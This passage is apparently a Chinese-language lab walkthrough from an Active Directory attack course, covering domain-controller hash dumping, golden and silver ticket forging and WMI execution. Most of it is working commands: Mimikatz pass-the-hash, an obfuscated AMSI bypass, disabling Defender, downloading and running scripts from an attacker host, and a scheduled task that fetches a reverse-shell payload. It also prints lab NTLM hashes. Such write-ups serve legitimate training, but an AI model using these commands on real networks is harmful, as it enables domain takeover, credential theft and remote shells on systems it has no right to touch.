         * DPAPI    : 9892675d75e91baace876950ee2fe5e8
```

收集到ciadmin的NTML
```
ciadmin:e08253add90dccf1a208523d02998c3d
```

开一个ciadmin权限的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:ciadmin /domain:dollarcorp.moneycorp.local /ntlm:e08253add90dccf1a208523d02998c3d /run:powershell.exe"'
```

因为ciadmin可以横向到dcorp-mgmt，也就是上面userhunter里DA管理员登陆过的机器。这台机器里存储了DA管理员的登录session，我们可以利用它导出NTML，从而提升域管理员权限

```
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
```

在指定session里载入Mimikatz
```
Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

指定目标靶机的session，在目标靶机关闭杀软（效果跟bypass AMSI大同小异，不过因为我们是目标靶机上的管理员，因此可以直接关闭）
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```

指定目标靶机的session，在目标靶机执行Mimikatz
```
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```

收集到的哈希信息
```
DCORP-MGMT$ : 639c1adde3e0d1ba0d733c7d0d8f23ec
mgmtadmin :  95e2cd7ff77379e34c6e46265e75d754
svcadmin : b38ff50264b74508085d82c69794a4d8
```

已拿到svcadmin的NTML

# Learning Objective 8:
Task
● Dump hashes on the domain controller of dollarcorp.moneycorp.local.
● Using the NTLM hash of krbtgt account, create a Golden ticket.
● Use the Golden ticket to (once again) get domain admin privileges from a machine.


## Dump hashes on the domain controller of dollarcorp.moneycorp.local.

开一个svcadmin权限的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
```

查看可以横向的计算机
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-LocalAdminAccess
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-std370.dollarcorp.moneycorp.local
dcorp-stdadm.dollarcorp.moneycorp.local
dcorp-std368.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
dcorp-dc.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-std363.dollarcorp.moneycorp.local
dcorp-std359.dollarcorp.moneycorp.local
dcorp-std367.dollarcorp.moneycorp.local
mcorp-std366.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-std360.dollarcorp.moneycorp.local
dcorp-std364.dollarcorp.moneycorp.local
dcorp-std361.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-std369.dollarcorp.moneycorp.local
```

可以横向到DC：dcorp-dc.dollarcorp.moneycorp.local

横向到dcorp-dc，执行Invoke-Mimikatz导出本地所有哈希，因为是在DC上操作，所以会导出整个域的NTML
```
PS C:\ad> Enter-PSSession dcorp-dc
[dcorp-dc]: PS C:\Users\svcadmin\Documents> powershell -ep bypass
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users\svcadmin\Documents>
[dcorp-dc]: PS C:\Users\svcadmin\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0
}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Ut
i'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}"
 -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLU
E"( ${n`ULl},${t`RuE} )
[dcorp-dc]: PS C:\Users\svcadmin\Documents> iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
[dcorp-dc]: PS C:\Users\svcadmin\Documents> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

收集到的NTML
```
Administrator：af0686cc0ca8f04df42210c9ac980760
DCORP-DC$ ： 126289c16302fb23b71ec09f0d3d5391
krbtgt ： ff46a9d8bd66c6efd77603da26796f35
websvc ： cc098f204c5887eaa8253e7c2749156f
srvadmin ：a98e18228819e8eec3dfa33cb68b0728
appadmin ： d549831a955fee51a43c83efb3928fa7
mgmtadmin ： 95e2cd7ff77379e34c6e46265e75d754
studentadmin ： d1254f303421d3cdbdc4c73a5bce0201
sql1admin ： e999ae4bd06932620a1e78d2112138c6
testda ：a16452f790729fa34e8f3a08f234a82c
```

##  Using the NTLM hash of krbtgt account, create a Golden ticket.


开一个新的学生权限的shell
执行：
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

## Use the Golden ticket to (once again) get domain admin privileges from a machine.
验证金票：
```
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```


新建一个定时任务，反弹dc上的一个shell回来。需要注意Invoke-PowerShellTcp.ps1里最后一行要加上
```
Power -Reverse -IPAddress 172.16.100.66 -Port 443
```
表示调用自己

### 制作定时任务：
```
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```

### 触发定时任务
```
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User366"
```

拿到反弹shell
```
PS C:\ad> .\nc.exe -lnvp 443
listening on [any] 443 ...
connect to [172.16.100.66] from (UNKNOWN) [172.16.2.1] 64573
Windows PowerShell running as user DCORP-DC$ on DCORP-DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system
PS C:\Windows\system32> hostname
dcorp-dc
PS C:\Windows\system32>
```


# Learning Objective 9:
Task
● Try to get command execution on the domain controller by creating silver ticket for:
− HOST service
− WMI


## HOST service
因为之前已经取得了DC服务器的NTML信息

```
DCORP-DC$ ： 126289c16302fb23b71ec09f0d3d5391
```

可以利用来制作 银票

执行命令
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```

执行完上面命令，在当前shell会有一个Administrator的session

验证银票：
```
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```

新建一个定时任务，反弹dc上的一个shell回来。需要注意Invoke-PowerShellTcp.ps1里最后一行要加上
```
Power -Reverse -IPAddress 172.16.100.66 -Port 443
```
表示调用自己

### 制作定时任务：
```
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```

### 触发定时任务
```
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User366"
```

收到反弹shell
```
PS C:\ad> .\nc.exe -lnvp 443
listening on [any] 443 ...
connect to [172.16.100.66] from (UNKNOWN) [172.16.2.1] 64558
Windows PowerShell running as user DCORP-DC$ on DCORP-DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved

PS C:\Windows\system32>whoami
nt authority\system
PS C:\Windows\system32> hostname
dcorp-dc
PS C:\Windows\system32>
```

## WMI 

wmi按照lab手册需要两张tiket，一张是host，另一张是RPCSS，但是我貌似执行下面其中一条就可以。。

HOST
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```

RPCSS
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```

然后执行WMI 
```
PS C:\ad> Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local


SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 14393
RegisteredUser  : Windows User
SerialNumber    : 00377-80000-00000-AA805
Version         : 10.0.14393
```
